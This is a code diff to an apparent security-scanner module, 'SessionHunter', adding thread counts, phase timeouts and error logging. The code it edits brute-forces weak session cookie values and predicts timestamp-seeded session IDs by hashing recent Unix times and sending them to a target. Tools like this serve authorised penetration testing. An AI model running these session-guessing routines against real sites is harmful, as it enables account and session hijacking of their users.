@@ -19,7 +19,7 @@ import logging
 import math
 import re
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as _FutureTimeoutError
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
 
@@ -79,10 +79,14 @@ class SessionHunter(BaseScanner):
 
     name = "session_hunter"
     MAX_WORKERS = 8
+    # Overall timeout (seconds) for each sub-phase — prevents infinite hangs on slow targets
+    PHASE_TIMEOUT = 60
 
     def run(self, target: str, **kwargs) -> Dict:
         bucket = self.name
         self.results.setdefault(bucket, [])
+        workers = int(kwargs.get("threads", self.MAX_WORKERS))
+        phase_timeout = int(kwargs.get("op_timeout", self.PHASE_TIMEOUT))
 
         # 1. Analyze live cookies
         self._analyze_live_cookies(target, bucket)
@@ -91,10 +95,10 @@ class SessionHunter(BaseScanner):
         self._check_session_fixation(target, bucket)
 
         # 3. Dictionary attack on common weak values
-        self._brute_common(target, bucket)
+        self._brute_common(target, bucket, workers=workers, phase_timeout=phase_timeout)
 
         # 4. Timestamp-seed prediction
-        self._predict_timestamp_sessions(target, bucket)
+        self._predict_timestamp_sessions(target, bucket, workers=workers, phase_timeout=phase_timeout)
 
         return self.results
 
@@ -230,7 +234,7 @@ class SessionHunter(BaseScanner):
     # Common value brute-force
     # -------------------------------------------------------------------------
 
-    def _brute_common(self, url: str, bucket: str):
+    def _brute_common(self, url: str, bucket: str, workers: int = 8, phase_timeout: int = 60):
         """Dictionary attack: try well-known weak session ID values."""
         ua = self.session.headers.get("User-Agent", "Mozilla/5.0")
 
@@ -251,41 +255,46 @@ class SessionHunter(BaseScanner):
                         evidence={"cookie": f"{name}={value}", "status": resp.status_code},
                     )
             except Exception as exc:
-                pass
+                logger.debug("[SessionHunter] brute_common error: %s", exc)
             return None
 
-        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as pool:
+        with ThreadPoolExecutor(max_workers=workers) as pool:
             futures = {
                 pool.submit(check_one, name, val): (name, val)
                 for name in _SESSION_NAMES[:6]
                 for val in _WEAK_VALUES
             }
-            for f in as_completed(futures):
-                result = f.result()
-                if result:
-                    self.add(bucket, result)
-                    add_result("offensive", result)
+            try:
+                for f in as_completed(futures, timeout=phase_timeout):
+                    result = f.result()
+                    if result:
+                        self.add(bucket, result)
+                        add_result("offensive", result)
+            except _FutureTimeoutError:
+                logger.warning("[SessionHunter] _brute_common timed out after %ds, cancelling remaining tasks", phase_timeout)
+                for f in futures:
+                    f.cancel()
 
     # -------------------------------------------------------------------------
     # Timestamp-seed prediction
     # -------------------------------------------------------------------------
 
-    def _predict_timestamp_sessions(self, url: str, bucket: str):
+    def _predict_timestamp_sessions(self, url: str, bucket: str, workers: int = 8, phase_timeout: int = 60):
         """
-        Generate candidate session IDs from Unix timestamps (last 30 min).
+        Generate candidate session IDs from Unix timestamps (last 15 min).
         Covers MD5/SHA256/base64/uid-hash variants used by weak generators.
         """
         now = int(time.time())
-        seeds = list(range(now - 1800, now, 15))  # every 15s over 30 min
+        seeds = list(range(now - 900, now, 30))  # every 30s over 15 min → ~30 seeds
         ua = self.session.headers.get("User-Agent", "Mozilla/5.0")
 
-        logger.info(f"[SessionHunter] Testing {len(seeds)} timestamp seeds against {url}")
+        logger.info("[SessionHunter] Testing %d timestamp seeds against %s", len(seeds), url)
 
         def test_seed(ts: int) -> Optional[Dict]:
             ts_str = str(ts)
             candidates = [
                 hashlib.md5(ts_str.encode()).hexdigest(),
-                hashlib.md5(ts_str.encode()).hexdigest()[:26],       # PHP 26-char style
+                hashlib.md5(ts_str.encode()).hexdigest()[:26],
                 hashlib.sha256(f"session:{ts}".encode()).hexdigest()[:32],
                 base64.urlsafe_b64encode(ts_str.encode()).decode().rstrip("="),
                 hashlib.md5(f"user:1:{ts}".encode()).hexdigest(),
@@ -312,16 +321,21 @@ class SessionHunter(BaseScanner):
                                 evidence={"seed_timestamp": ts, "cookie": f"{name}={val}"},
                             )
                     except Exception as exc:
-                        pass
+                        logger.debug("[SessionHunter] test_seed error ts=%d: %s", ts, exc)
             return None
 
-        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as pool:
+        with ThreadPoolExecutor(max_workers=workers) as pool:
             futures = {pool.submit(test_seed, ts): ts for ts in seeds}
-            for f in as_completed(futures):
-                result = f.result()
-                if result:
-                    self.add(bucket, result)
-                    add_result("offensive", result)
+            try:
+                for f in as_completed(futures, timeout=phase_timeout):
+                    result = f.result()
+                    if result:
+                        self.add(bucket, result)
+                        add_result("offensive", result)
+            except _FutureTimeoutError:
+                logger.warning("[SessionHunter] _predict_timestamp_sessions timed out after %ds, cancelling remaining tasks", phase_timeout)
+                for f in futures:
+                    f.cancel()
 
 
 # ---------------------------------------------------------------------------
